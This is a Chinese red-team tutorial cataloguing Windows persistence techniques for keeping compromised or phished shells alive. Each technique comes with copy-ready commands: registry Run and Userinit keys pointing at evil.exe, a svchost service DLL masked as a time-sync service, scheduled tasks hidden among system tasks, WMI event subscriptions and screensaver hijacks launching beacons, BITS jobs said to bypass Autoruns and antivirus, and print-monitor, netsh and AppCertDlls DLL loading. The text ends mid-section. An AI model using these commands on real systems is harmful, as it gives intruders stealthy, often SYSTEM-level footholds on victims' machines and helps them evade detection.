# Windows权限维持技术整理
# Windows权限维持

Author: Hunter@深蓝攻防实验室

## 0x00 前言&场景

在红队中对于拿到的shell或钓上来的鱼，目前比较流行用CS做统一管理，但实战中发现CS官方没有集成一键权限维持的功能，收集的一些第三方开发的插件也大多不完善或者使用很麻烦，甚至有一些还有BUG导致我们以为成功了实际上却没有，最终丢掉了shell。  
故基于此场景整理Windows环境中的持久化方法，后续将一些比较常用且便捷的操作整合成CS插件，确保在拿到shell的时候快速保住权限。

## 0x01 Startup目录

权限要求：提权不提权都可。  
这是最常用也是最简单的权限维持了，放在该目录下的程序或快捷方式会在用户登录时自动运行，就不多说了。  
NT6以后的目录如下：

```
对当前用户有效：
C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
对所有用户有效：
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

NT6以前的目录如下：

```
对当前用户有效：
C:\Documents and Settings\Hunter\「开始」菜单\程序\启动
对所有用户有效：
C:\Documents and Settings\All Users\「开始」菜单\程序\启动
```

## 0x02 注册键

权限要求：提权不提权都可。  
Windows庞大的注册表以及相对不严格的权限管理给了我们很多做手脚的机会，其中注册表自启项是比较常用的持久化操作了。  
注册表作为Windows的核心数据库，存储着系统和用户的很多关键信息。  
Windows在注册表中提供了两套独立的路径，一个是上面提到的当前用户的“HKEY\_CURRENT\_USER”即“HKCU”，另一个就是针对当前用户物理状态的“HKEY\_LOCAL\_MACHINE”即“HKLM”，仅有特权账户可以对其进行修改。  
随着安全意识的提高，目前在红队中搞到的Windows大多都是降权的。特别是钓鱼得到的PC机提权的意义不大，因为即使提权写了Administrator的启动项，用户下一次登录也还是进自己的账户，持久化就白做了。  
整理Windows下的所有注册键如下：

```
1.Load注册键
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Windows＼load

2.Userinit注册键
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Winlogon＼Userinit
通常该注册键下面有一个userinit.exe。该键允许指定用逗号分隔的多个程序，如userinit.exe,evil.exe。

3.Explorer＼Run注册键
Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run
Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。

4.RunServicesOnce注册键
RunServicesOnce注册键用来启动服务程序，启动时间在用户登录之前，而且先于其他通过注册键启动的程序，在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunServicesOnce
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼ Windows＼CurrentVersion＼RunServicesOnce

5.RunServices注册键
RunServices注册键指定的程序紧接RunServicesOnce指定的程序之后运行，但两者都在用户登录之前。
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼ RunServices
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼ CurrentVersion＼RunServices

6.RunOnce＼Setup注册键
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup

7.RunOnce注册键
安装程序通常用RunOnce键自动运行程序，它的位置在
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce
[小于NT6]HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnceEx
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce
HKEY_LOCAL_MACHINE下面的RunOnce键会在用户登录之后立即运行程序，运行时机在其他Run键指定的程序之前；HKEY_CURRENT_USER下面的RunOnce键在操作系统处理其他Run键以及“启动”文件夹的内容之后运行。

8.Run注册键
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Run
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Run
Run是自动运行程序最常用的注册键，HKEY_CURRENT_USER下面的Run键紧接HKEY_LOCAL_MACHINE下面的Run键运行，但两者都在处理“启动”文件夹之前。
```

写入注册键命令如下：  
`reg add "XXXX" /v evil /t REG_SZ /d "[Absolute Path]\evil.exe"`

## 0x03 服务

权限要求：未降权的管理员权限。  
创建服务是需要非降权管理员权限的，因此拿到shell后要用这种方法做维持首先要提权，但其优点是隐蔽性比注册键高（如用svchost的服务组加载DLL就可以隐藏掉恶意进程）。CMD和Powershell都可以用命令添加服务，样例如下：  
`sc create evil binpath= "cmd.exe /k [Absolute Path]evil.exe" start= "auto" obj= "LocalSystem"`  
这种直接通过cmd拉起的服务创建起来很简单。这里需要注意一个小坑：shellcodeloader主线程会阻塞导致服务启动时认为程序无响应而失败，因此必须用cmd拉起来，不能直接创建服务。服务正常启动后进程以SYSTEM权限在用户登录前运行。但缺点也很明显，恶意进程还是独立存在的，隐蔽性较差。如下图：

[![](_v_images/20200812113233005_12382.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142200-a3bf1cea-d551-1.jpeg)

还有一类服务是通过svchost启动，由于Windows系统中的许多服务都是通过注入到该程序中启动（这也是官方认可的DLL注入动作），因此只要DLL本身免杀，杀毒软件就不会理会这种行为，并且由于恶意进程并不是独立存在的，隐蔽性相对较高。  
但使用svchost加载服务就不是一行命令可以完成的，不仅需要自己做一个服务DLL，还需要额外在注册表中添加一些东西。由于64位系统有两套注册表和两套svchost，因此命令还有微小的不同。  
32位系统命令如下：

```
sc create TimeSync binPath= "C:\Windows\System32\svchost.exe -k netsvr" start= auto obj= LocalSystem
reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync\Parameters /v ServiceDll /t REG_EXPAND_SZ /d "C:\Users\hunter\Desktop\localService32.dll" /f /reg:32
reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync /v Description /t REG_SZ /d "Windows Time Synchronization Service" /f /reg:32
reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync /v DisplayName /t REG_SZ /d "TimeSyncSrv" /f /reg:32
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v netsvr /t REG_MULTI_SZ /d TimeSync /f /reg:32
sc start TimeSync
```

64位系统中注册32位服务命令如下：

```
sc create TimeSync binPath= "C:\Windows\Syswow64\svchost.exe -k netsvr" start= auto obj= LocalSystem
reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync\Parameters /v ServiceDll /t REG_EXPAND_SZ /d "C:\Users\hunter\Desktop\localService32.dll" /f /reg:32
reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync /v Description /t REG_SZ /d "Windows Time Synchronization Service" /f /reg:32
reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync /v DisplayName /t REG_SZ /d "TimeSyncSrv" /f /reg:32
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v netsvr /t REG_MULTI_SZ /d TimeSync /f /reg:32
sc start TimeSync
```

64位系统命令如下：

```
sc create TimeSync binPath= "C:\Windows\System32\svchost.exe -k netsvr" start= auto obj= LocalSystem
reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync\Parameters /v ServiceDll /t REG_EXPAND_SZ /d "C:\Users\hunter\Desktop\localService32.dll" /f /reg:64
reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync /v Description /t REG_SZ /d "Windows Time Synchronization Service" /f /reg:64
reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync /v DisplayName /t REG_SZ /d "TimeSyncSrv" /f /reg:64
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v netsvr /t REG_MULTI_SZ /d TimeSync /f /reg:64
sc start TimeSync
```

注意这里有个大坑，使用“reg add”命令向注册表键中添加数据的时候是直接覆盖的，而“HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost”中的大多数的键都是REG\_MULTI\_SZ类型，即多行数据。因此千万不能直向已经存在的键中写入数据，系统启动所需要的服务都在里面，覆盖后会出大问题！（所以上面命令中是用的“netsvr”，这个键默认是不存在的）

## 0x04 计划任务

权限要求：未降权的管理员权限/普通用户。  
计划任务也是一项很好的持久化利用点。不同于自启注册键和服务项，计划任务的设定方式更多样、灵活，位置也相对较为隐蔽（手工排查要多点几下）。比如，曾经在一线做安服的时候，有一阵子碰到闹得很凶的“驱动人生”挖矿木马其中的一个持久化方式就是在定时任务中创建了很多powershell脚本来做的持久化，它的stager直接以base64编码的方式写在计划任务的命令行参数中。那个输入框很短，对没有经验的工程师来说后面的内容就很容易没有看到而忽略掉。  
Windows中有命令“SCHTASKS”用来管理计划任务，支持下面几个选项：

```
SCHTASKS /parameter [arguments]

描述:
    允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任
    务。

参数列表:
    /Create         创建新计划任务。

    /Delete         删除计划任务。

    /Query          显示所有计划任务。

    /Change         更改计划任务属性。

    /Run            按需运行计划任务。

    /End            中止当前正在运行的计划任务。

    /ShowSid        显示与计划的任务名称相应的安全标识符。

    /?              显示此帮助消息。
```

在持久化过程中比较常用的命令是Create，由于参数相对较多因此复制到下面做参考：

```
SCHTASKS /Create [/S system [/U username [/P [password]]]]
    [/RU username [/RP password]] /SC schedule [/MO modifier] [/D day]
    [/M months] [/I idletime] /TN taskname /TR taskrun [/ST starttime]
    [/RI interval] [ {/ET endtime | /DU duration} [/K] [/XML xmlfile] [/V1]]
    [/SD startdate] [/ED enddate] [/IT | /NP] [/Z] [/F]

描述:
     允许管理员在本地或远程系统上创建计划任务。

参数列表:
    /S   system        指定要连接到的远程系统。如果省略这个
                       系统参数，默认是本地系统。

    /U   username      指定应在其中执行 SchTasks.exe 的用户上下文。

    /P   [password]    指定给定用户上下文的密码。如果省略则
                       提示输入。

    /RU  username      指定任务在其下运行的“运行方式”用户
                       帐户(用户上下文)。对于系统帐户，有效
                       值是 ""、"NT AUTHORITY\SYSTEM" 或
                       "SYSTEM"。
                       对于 v2 任务，"NT AUTHORITY\LOCALSERVICE"和
                       "NT AUTHORITY\NETWORKSERVICE"以及常见的 SID
                         对这三个也都可用。

    /RP  [password]    指定“运行方式”用户的密码。要提示输
                       入密码，值必须是 "*" 或无。系统帐户会忽略该
                       密码。必须和 /RU 或 /XML 开关一起使用。

/RU/XML    /SC   schedule     指定计划频率。
                       有效计划任务:  MINUTE、 HOURLY、DAILY、WEEKLY、
                       MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, ONEVENT.

    /MO   modifier     改进计划类型以允许更好地控制计划重复
                       周期。有效值列于下面“修改者”部分中。

    /D    days         指定该周内运行任务的日期。有效值:
                       MON、TUE、WED、THU、FRI、SAT、SUN
                       和对 MONTHLY 计划的 1 - 31
                       (某月中的日期)。通配符“*”指定所有日期。

    /M    months       指定一年内的某月。默认是该月的第一天。
                       有效值: JAN、FEB、MAR、APR、MAY、JUN、
                       JUL、 AUG、SEP、OCT、NOV  和 DEC。通配符
                       “*” 指定所有的月。

    /I    idletime     指定运行一个已计划的 ONIDLE 任务之前
                       要等待的空闲时间。
                       有效值范围: 1 到 999 分钟。

    /TN   taskname     指定唯一识别这个计划任务的名称。

    /TR   taskrun      指定在这个计划时间运行的程序的路径
                       和文件名。
                       例如: C:\windows\system32\calc.exe

    /ST   starttime    指定运行任务的开始时间。
                       时间格式为 HH:mm (24 小时时间)，例如 14:30 表示
                       2:30 PM。如果未指定 /ST，则默认值为
                       当前时间。/SC ONCE 必需有此选项。

    /RI   interval     用分钟指定重复间隔。这不适用于
                       计划类型: MINUTE、HOURLY、
                       ONSTART, ONLOGON, ONIDLE, ONEVENT.
                       有效范围: 1 - 599940 分钟。
                       如果已指定 /ET 或 /DU，则其默认值为
                       10 分钟。

    /ET   endtime      指定运行任务的结束时间。
                       时间格式为 HH:mm (24 小时时间)，例如，14:50 表示 2:50 PM
。
                       这不适用于计划类型: ONSTART、
                       ONLOGON, ONIDLE, ONEVENT.

    /DU   duration     指定运行任务的持续时间。
                       时间格式为 HH:mm。这不适用于 /ET 和
                       计划类型: ONSTART, ONLOGON, ONIDLE, ONEVENT.
                       对于 /V1 任务，如果已指定 /RI，则持续时间默认值为
                       1 小时。

    /K                 在结束时间或持续时间终止任务。
                       这不适用于计划类型: ONSTART、
                       ONLOGON, ONIDLE, ONEVENT.
                       必须指定 /ET 或 /DU。

    /SD   startdate    指定运行任务的第一个日期。
                       格式为 yyyy/mm/dd。默认值为
                       当前日期。这不适用于计划类型: ONCE、
                       ONSTART, ONLOGON, ONIDLE, ONEVENT.

    /ED   enddate      指定此任务运行的最后一天的日期。
                       格式是 yyyy/mm/dd。这不适用于计划类型:
                        ONCE、ONSTART、ONLOGON、ONIDLE。

    /EC   ChannelName  为 OnEvent 触发器指定事件通道。

    /IT                仅有在 /RU 用户当前已登录且
                       作业正在运行时才可以交互式运行任务。
                       此任务只有在用户已登录的情况下才运行。

    /NP                不储存任何密码。任务以给定用户的身份
                       非交互的方式运行。只有本地资源可用。

    /Z                 标记在最终运行完任务后删除任务。

    /XML  xmlfile      从文件的指定任务 XML 中创建任务。
                       可以组合使用 /RU 和 /RP 开关，或者在任务 XML 已包含
                       主体时单独使用 /RP。

    /V1                创建 Vista 以前的平台可以看见的任务。
                       不兼容 /XML。

    /F                 如果指定的任务已经存在，则强制创建
                       任务并抑制警告。

    /RL   level        为作业设置运行级别。有效值为
                       LIMITED 和 HIGHEST。默认值为 LIMITED。

    /DELAY delaytime   指定触发触发器后延迟任务运行的
                       等待时间。时间格式为
                       mmmm:ss。此选项仅对计划类型
                       ONSTART, ONLOGON, ONEVENT.

    /?                 显示此帮助消息。

修改者: 按计划类型的 /MO 开关的有效值:
    MINUTE:  1 到 1439 分钟。
    HOURLY:  1 - 23 小时。
    DAILY:   1 到 365 天。
    WEEKLY:  1 到 52 周。
    ONCE:    无修改者。
    ONSTART: 无修改者。
    ONLOGON: 无修改者。
    ONIDLE:  无修改者。
    MONTHLY: 1 到 12，或
             FIRST, SECOND, THIRD, FOURTH, LAST, LASTDAY。

    ONEVENT:  XPath 事件查询字符串。
示例:
    ==> 在远程机器 "ABC" 上创建计划任务 "doc"，
        该机器每小时在 "runasuser" 用户下运行 notepad.exe。

        SCHTASKS /Create /S ABC /U user /P password /RU runasuser
                 /RP runaspassword /SC HOURLY /TN doc /TR notepad

    ==> 在远程机器 "ABC" 上创建计划任务 "accountant"，
        在指定的开始日期和结束日期之间的开始时间和结束时间内，
        每隔五分钟运行 calc.exe。

        SCHTASKS /Create /S ABC /U domain\user /P password /SC MINUTE
                 /MO 5 /TN accountant /TR calc.exe /ST 12:00 /ET 14:00
                 /SD 06/06/2006 /ED 06/06/2006 /RU runasuser /RP userpassword

    ==> 创建计划任务 "gametime"，在每月的第一个星期天
        运行“空当接龙”。

        SCHTASKS /Create /SC MONTHLY /MO first /D SUN /TN gametime
                 /TR c:\windows\system32\freecell

    ==> 在远程机器 "ABC" 创建计划任务 "report"，
        每个星期运行 notepad.exe。

        SCHTASKS /Create /S ABC /U user /P password /RU runasuser
                 /RP runaspassword /SC WEEKLY /TN report /TR notepad.exe

    ==> 在远程机器 "ABC" 创建计划任务 "logtracker"，
        每隔五分钟从指定的开始时间到无结束时间，
        运行 notepad.exe。将提示输入 /RP
        密码。

        SCHTASKS /Create /S ABC /U domain\user /P password /SC MINUTE
                 /MO 5 /TN logtracker
                 /TR c:\windows\system32\notepad.exe /ST 18:30
                 /RU runasuser /RP

    ==> 创建计划任务 "gaming"，每天从 12:00 点开始到
        14:00 点自动结束，运行 freecell.exe。

        SCHTASKS /Create /SC DAILY /TN gaming /TR c:\freecell /ST 12:00
                 /ET 14:00 /K
    ==> 创建计划任务“EventLog”以开始运行 wevtvwr.msc
        只要在“系统”通道中发布事件 101

        SCHTASKS /Create /TN EventLog /TR wevtvwr.msc /SC ONEVENT
                 /EC System /MO *[System/EventID=101]
    ==> 文件路径中可以加入空格，但需要加上两组引号，
        一组引号用于 CMD.EXE，另一组用于 SchTasks.exe。用于 CMD
        的外部引号必须是一对双引号；内部引号可以是一对单引号或
        一对转义双引号:
        SCHTASKS /Create
           /tr "'c:\program files\internet explorer\iexplorer.exe'
           \"c:\log data\today.xml\"" ...
```

“计划任务程序库”中也是有路径的，Windows初始状态在根目录中是没有计划任务的，如下图：

[![](_v_images/20200812113232081_14680.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142311-ce121c4a-d551-1.jpeg)

当然子目录中也是没有计划任务的：

[![](_v_images/20200812113231370_16793.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142319-d31fbdb4-d551-1.jpeg)

[![](_v_images/20200812113230760_19164.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142328-d81bf170-d551-1.jpeg)

计划任务都被放在了最内层目录里面，因此为了确保隐蔽性，我们也可以遵守Windows默认的规范在“\\Microsoft\\Windows\\”下面新建我们的子目录和计划任务。示例命令如下：  
`SCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN \Microsoft\Windows\evil\eviltask /TR C:\Users\hunter\Desktop\evil.exe`  
无需登录即可收到beacon：

[![](_v_images/20200812113229748_3613.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142341-dfb74c7c-d551-1.jpeg)

在进程树中，恶意进程是被taskeng.exe即任务计划程序引擎拉起的，隐蔽性弱于DLL服务，但强于自启注册键。  
但是，大坑又来了，我们发现SCHTASKS命令功能并不完整，很多配置项是无法操作的，比如不支持同时创建多个触发器，不支持修改“条件”和“设置”选项卡中的功能。如下：

[![](_v_images/20200812113226074_9913.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142354-e78c1f0e-d551-1.jpeg)

[![](_v_images/20200812113225062_30241.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142401-ebd756fa-d551-1.jpeg)

这些选项都是任务创建时的默认状态，也就是说我们的计划任务不会在睡眠唤醒时启动，断开交流电源自动停止，超过3天自动停止。而这些高级选项却不支持用命令行配置，查了一下微软社区，官方给的回复竟然是这样的：

[![](_v_images/20200812113224150_20501.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142411-f1a17a5c-d551-1.jpeg)

哭笑不得...对于正常用户使用起来确实没问题，但对于红队来说，我们不方便操作GUI啊！当然也可以通过制作DLL模块或exe直接调用WINAPI来操作，但那还需要额外再上传一个文件，效率稍低。因此计划任务这个持久化的路子只能作为一个保险，并不能完全依赖。  
此外还有一个有些相似的利用点——组策略。在启动脚本处可以执行cmd脚本或ps脚本从而执行任意命令，但由于命令行版本的组策略编辑器功能太过受限，就不再做展开（如果可以登录桌面的话直接去gpedit.msc去配置启动脚本即可持久化，且隐蔽性较高）。

## 0x05 WMI

权限要求：未降权的管理员权限。  
我们可以认为WMI是一组可以直接与Windows操作系统交互的API，由于这是操作系统自带的工具，无需安装，因此也是权限维持的好帮手。  
由于WMI的事件会循环执行，为确保不会无限弹shell，可以使用系统启动时间来限制（只要触发延时可以落在限定区间即可，有些机器启动慢因此起始时间调高些）。示例命令如下：

```
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="evil", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 310"

wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="evilConsumer", ExecutablePath="C:\Users\hunter\Desktop\beacon.exe",CommandLineTemplate="C:\Users\hunter\Desktop\beacon.exe"

wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"evil\"", Consumer="CommandLineEventConsumer.Name=\"evilConsumer\""
```

由于时间区间的落点不一定相同，特定情况下有可能会出现多个beacon：

[![](_v_images/20200812113223441_12407.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142425-fa7f926c-d551-1.jpeg)

看下进程树，隐蔽性一般：

[![](_v_images/20200812113222631_1750.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142437-01598b56-d552-1.jpeg)

## 0x06 屏幕保护

权限要求：普通用户。  
虽然未必所有用户都会使用屏幕保护，但幸运的是屏幕保护程序的相关配置都在注册表中，如下图的四个键：

[![](_v_images/20200812113221007_23534.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142509-14987ba0-d552-1.jpeg)

完整路径如下：

```
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut
HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE
```

直接写入注册表即可：

```
reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d C:\Users\hunter\Desktop\beacon.exe /f
reg add "hkcu\control panel\desktop" /v ScreenSaveActive /d 1 /f
reg add "hkcu\control panel\desktop" /v ScreenSaverIsSecure /d 0 /f
reg add "hkcu\control panel\desktop" /v ScreenSaveTimeOut /d 60 /f
```

看一下进程树，winlogon.exe拉起来的，隐蔽性一般：

[![](_v_images/20200812113219796_16365.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142526-1ea7abde-d552-1.jpeg)

这里又有个小坑，如果从未设置过屏保程序的话，除“ScreenSaveActive”默认值为1，其他键都是不存在的，而屏保程序的正常运行必须保证这几个键都有数据才可以，因此必须把4个键都重写一遍。另外，经测试屏保程序最短触发时间为60秒，即使改成小于60的数值，依然还是60秒后执行程序。  
当然，从注册表路径也可以看出这种方式只能获得当前用户权限的shell，优点是不需要提权即可维持。

## 0x07 后台智能传输服务（BITS）

权限要求：管理员权限（不必过UAC）。  
后台智能传送服务 (BITS) 可帮助传输大量数据而不会降低网络性能。它通过在小区块中传输数据、充分利用可用的但未使用的带宽和在目的地重组数据的方式来实现此操作。在 Microsoft® Windows Server 2003 家族操作系统上和 Microsoft® Windows 2000 上都支持 BITS。——摘自百度百科  
网上的“渗透教程”中有很多利用bitsadmin命令下载文件或执行命令的操作，但它其实也可以用来做权限维持，并且可以绕过Autoruns的检测以及杀软的自启命令执行保护。  
添加任务的命令很简单，只有4条：

```
bitsadmin /create evil
bitsadmin /addfile evil "C:\Users\hunter\Desktop\beacon.exe" "C:\Users\hunter\Desktop\beacon.exe"
bitsadmin.exe /SetNotifyCmdLine evil "C:\Users\hunter\Desktop\beacon.exe" NUL
bitsadmin /Resume evil
```

其有个优点是可以在降权的管理员回话中执行（不过UAC），当然得到的beacon也是降权的：

[![](_v_images/20200812113218888_9938.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142540-26d27f28-d552-1.jpeg)

重启后由于任务并未结束，依然会被系统拉起，达到了持久化的目的。虽然后台智能传输服务的任务默认时长是90天，90天后任务自动取消，但对于红队来说这已经足够了：

[![](_v_images/20200812113218179_8864.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142549-2c09be3e-d552-1.jpeg)

看一下进程树，是“svchost.exe -k netsvcs"拉起的。但由于是独立进程，隐蔽性一般：

[![](_v_images/20200812113216963_31309.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142617-3d298c62-d552-1.jpeg)

这种方法可以绕过目前所有启动项检查工具，唯一检测方式是通过bistamin命令：  
`bitsadmin /list /allusers /verbose`  
可以看到所有任务如下（忘记截图，这是另一台测试机，数据不同）：

[![](_v_images/20200812113215648_30527.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142655-539d285a-d552-1.jpeg)

## 0x07 后台打印程序服务

权限要求：未降权的管理员权限。  
后台打印程序服务负责管理Windows操作系统中的打印作业，由于很多用户还是要使用打印机的，所以优化软件也不会推荐禁用这个服务。打印后台处理程序的API包含一个函数-AddMonitor，用于安装本地端口监视器并连接配置、数据和监视器文件。该函数会将DLL注入到spoolsv.exe进程以实现相应功能。系统初始状态下需要调用的DLL如下：

[![](_v_images/20200812113214635_27502.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142717-60ece680-d552-1.jpeg)

[![](_v_images/20200812113213928_13105.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142727-66a14d78-d552-1.jpeg)

[![](_v_images/20200812113213321_547.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142739-6df9ba4c-d552-1.jpeg)

[![](_v_images/20200812113212714_32575.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142758-7962eb38-d552-1.jpeg)

[![](_v_images/20200812113212107_15981.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142808-7f22a36a-d552-1.jpeg)

这些DLL都是包含与打印服务驱动相关的内容，那么我们也可以利用这个机制驻留一个恶意DLL，当然，和注册服务一样，这必须要未降权的管理员权限。  
首先将恶意DLL放到C:\\Windows\\System32\\路径下：

[![](_v_images/20200812113211698_2173.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142819-85879b16-d552-1.jpeg)

然后执行命令添加相关注册表项和Driver键：  
`reg add "hklm\system\currentcontrolset\control\print\monitors\monitor" /v "Driver" /d "monitor.dll" /t REG_SZ`

[![](_v_images/20200812113210482_13967.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142832-8d78fc5c-d552-1.jpeg)

重新启动后，恶意DLL则会被自动加载到spoolsv.exe，隐蔽性较强：

[![](_v_images/20200812113209263_29007.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142845-951feed4-d552-1.jpeg)

控制端以SYSTEM权限上线（这里演示暂时用的MSF，CS的DLL还要自己重写一个）：

[![](_v_images/20200812113205610_17683.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142856-9c0387ec-d552-1.jpeg)

## 0x08 Netsh

权限要求：未降权的管理员权限。  
netsh也是Windows自带的命令，是用来配置网络的命令行工具。该工具可以通过导入helperdll的方式实现功能，且DLL导入后会写进注册表，永久有效：

[![](_v_images/20200812113204079_8010.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142909-a34d2bca-d552-1.jpeg)

因此可以通过导入helperdll的方式做权限维持，命令格式如下：  
`netsh add helper [Absolute evil DLL path]`  
但是由于netsh并不会开启自启动，因此还要再写一条自启动项：  
`reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Pentestlab /t REG_SZ /d "cmd /c C:\Windows\System32\netsh"`  
重新启动后依然可获得shell：

[![](_v_images/20200812113202148_5069.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803142958-c0eaa3f6-d552-1.jpeg)

进程树和加载的恶意模块如下，隐蔽性较强：

[![](_v_images/20200812113200316_15378.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803143012-c93d47de-d552-1.jpeg)

但由于测试过程依然使用的是msf生成的DLL，启动netsh的时候会弹出黑框并阻塞，关掉netsh进程后连接也就断掉了，因此后续实战应用还需要自己写DLL。

## 0x09 AppCertDlls

权限要求：未降权的管理员权限。  
众所周知注册表项“AppInit_DLLs”中的值会在user32.dll被加载到内存的时候被读取，若其中有值则调用API“LoadLibrary()”加载用户DLL。  
早些年用这个做DLL注入式持久化比较流行，但如今在很多新系统上却失效了。其原因是由于kernel32.dll在启动时有一个标记位的判断，如下图：

[![](_v_images/20200812113158895_29006.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803143032-d4fcef2a-d552-1.jpeg)

kernel32.dll对0x67的Class进行NtQuerySystemInformation后，检查ReturnLength与2的运算是否为0（是否相等），若相等则不加载DLL直接ret。  
关于0x67在网上可以查到相关资料：

[![](_v_images/20200812113158085_23133.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803143042-dab1532a-d552-1.jpeg)

它是由bcdedit.exe的“–set testsigning on/off”参数设置的，但现在比较新的机器一般都在BIOS中默认设置了secure boot，如果不关掉这个选项是无法修改上面的标记的。因此，这个方法目前局限性就比较大了。  
然而其实还有一个注册表项不太常用，并且也能够自动加载DLL，那就是AppCertDlls。当进程使用了CreateProcess、CreateProcessAsUser、CreateProcessWithLoginW、CreateProcessWithTokenW、WinExec这些API的时候，该项中的内容会被自动加载，而幸运的，是很多程序都会调用这些API。  
写一个测试程序调用上面的API：

[![](_v_images/20200812113156967_22621.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803143053-e1338c0e-d552-1.jpeg)

执行：

[![](_v_images/20200812113155447_7616.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803143101-e64ef28c-d552-1.jpeg)

msf上线：

[![](_v_images/20200812113154337_30071.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803143110-eb67e3dc-d552-1.jpeg)

看下进程树：

[![](_v_images/20200812113152918_21238.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200803143117-efb5c7e2-d552-1.jpeg)

只是在正常进程下面开了个rundll32.exe，将恶意DLL加载，隐蔽性较高。  
但使用msf的DLL依然只能做测试，由于系统的很多程序都会调用以上API（比如explorer.exe），而msf的DLL会导致进程阻塞，最终导致启动的时候进不去桌面，因此DLL还要之后自己写。

## 0x0A MSDTC

权限要求：未降权的管理员权限。  
msdtc.exe是微软分布式传输协调bai程序。该du进程调用系统Microsoft Personal Web Server和Microsoft SQL Server。该服务用于管理多个服务器。  
